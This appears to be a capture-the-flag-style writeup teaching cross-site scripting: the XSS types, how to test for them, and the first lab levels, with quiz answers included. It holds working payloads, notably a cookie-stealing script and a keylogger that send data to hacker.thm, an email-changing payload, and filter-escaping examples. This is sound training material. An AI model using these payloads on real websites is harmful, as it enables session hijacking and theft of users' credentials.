---
Learn how to detect and exploit XSS vulnerabilities, giving you control of other visitor's browsers.
---

# Cross-site Scripting — Writeup

## Overview
### Cross-site Scripting — Writeup
### Cross-site Scripting — Writeup
### Room Brief
Prerequisites:
It's worth noting that because XSS is based on JavaScript, it would be helpful to have a basic understanding of the language. However, none of the examples is overly complicated—also, a basic understanding of Client-Server requests and responses.
Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users. In this room, you'll learn about the different XSS types, how to create XSS payloads, how to modify your payloads to evade filters, and then end with a practical lab where you can try out your new skills.
Cross-site scripting vulnerabilities are extremely common. Below are a few reports of XSS found in massive applications; you can get paid very well for finding and reporting these vulnerabilities.
XSS found in Shopify
$7,500 for XSS found in Steam chat
$2,500 for XSS in HackerOne
XSS found in Infogram
What does XSS stand for? *Cross-site scripting*
### XSS Payloads
What is a payload?
In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.
The intention is what you wish the JavaScript to actually do (which we'll cover with some examples below), and the modification is the changes to the code we need to make it execute as every scenario is different (more on this in the perfecting your payload task).
Here are some examples of XSS intentions.
Proof Of Concept:
This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:
<script>alert('XSS');</script>
Session Stealing:
Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
Key Logger:
The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
Business Logic:
This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:
<script>user.changeEmail('attacker@hacker.thm');</script>
Now that the email address for the account has changed, the attacker may perform a reset password attack.
The next four tasks are going to cover the different types of XSS Vulnerabilities, all requiring slightly different attack payloads and user interaction.
Which document property could contain the user's session token?
*document.cookie*
Which JavaScript method is often used as a Proof Of Concept? *alert*
### Reflected XSS
Reflected XSS
Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.
Example Scenario:
A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the error parameter in the query string and is built directly into the page source.
The application doesn't check the contents of the error parameter, which allows the attacker to insert malicious code.
The vulnerability can be used as per the scenario in the image below:
Potential Impact:
The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.
How to test for Reflected XSS:
You'll need to test every possible point of entry; these include:
Parameters in the URL Query String
URL File Path
Sometimes HTTP Headers (although unlikely exploitable in practice)
Once you've found some data which is being reflected in the web application, you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected (you'll learn more about this in task 6).
Where in an URL is a good place to test for reflected XSS? *Parameters *
### Stored XSS
Stored XSS
As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.
Example Scenario:
A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.
Potential Impact:
The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.
How to test for Stored XSS:
You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:
Comments on a blog
User profile information
Website Listings
Sometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads.
Once you've found some data which is being stored in the web application,  you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected (you'll learn more about this in task 6).
How are stored XSS payloads usually stored on a website? *databases*
### DOM Based XSS
DOM Based XSS
What is the DOM?
DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source. A diagram of the HTML DOM is displayed below:
If you want to learn more about the DOM and gain a deeper understanding w3.org have a great resource.
Exploiting the DOM
DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.
Example Scenario:
The website's JavaScript gets the contents from the window.location.hash parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.
Potential Impact:
Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.
How to test for Dom Based XSS:
DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.
When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval().
What unsafe JavaScript method is good to look for in source code? *eval()*
### Blind XSS
Blind XSS
Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.
Example Scenario:
A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.
Potential Impact:
Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.
How to test for Blind XSS:
When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.
A popular tool for Blind XSS attacks is xsshunter. Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.
What tool can you use to test for Blind XSS? *xsshunter*
What type of XSS is very similar to Blind XSS? *stored XSS*
### Perfecting your payload
The payload is the JavaScript code we want to execute either on another user's browser or as a proof of concept to demonstrate a vulnerability in a website.
Your payload could have many intentions, from just bringing up a JavaScript alert box to prove we can execute JavaScript on the target website to extracting information from the webpage or user's session.
How your JavaScript payload gets reflected in a target website's code will determine the payload you need to use. To Explain this, click the green Start Machine button on the right, and when the machine has loaded, open the below link in a new tab.
https://10-10-129-59.p.thmlabs.com
The aim for each level will be to execute the JavaScript alert function with the string THM, for example:
<script>alert('THM');</script>
Level One:
You're presented with a form asking you to enter your name, and once you've entered your name, it will be presented on a line below, for example:
If you view the Page Source, You'll see your name reflected in the code:
Instead of entering your name, we're instead going to try entering the following JavaScript Payload: <script>alert('THM');</script>
Now when you click the enter button, you'll get an alert popup with the string THM and the page source will look like the following:
And then, you'll get a confirmation message that your payload was successful with a link to the next level.
Level Two:
Like the previous level, you're being asked again to enter your name. This time when clicking enter, your name is being reflected in an input tag instead:
Viewing the page source, you can see your name reflected inside the value attribute of the input tag:
It wouldn't work if you were to try the previous JavaScript payload because you can't run it from inside the input tag. Instead, we need to escape the input tag first so the payload can run properly. You can do this with the following payload: "><script>alert('THM');</script>
The important part of the payload is the "> which closes the value parameter and then closes the input tag.
This now closes the input tag properly and allows the JavaScript payload to run:
Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.
Level Three:
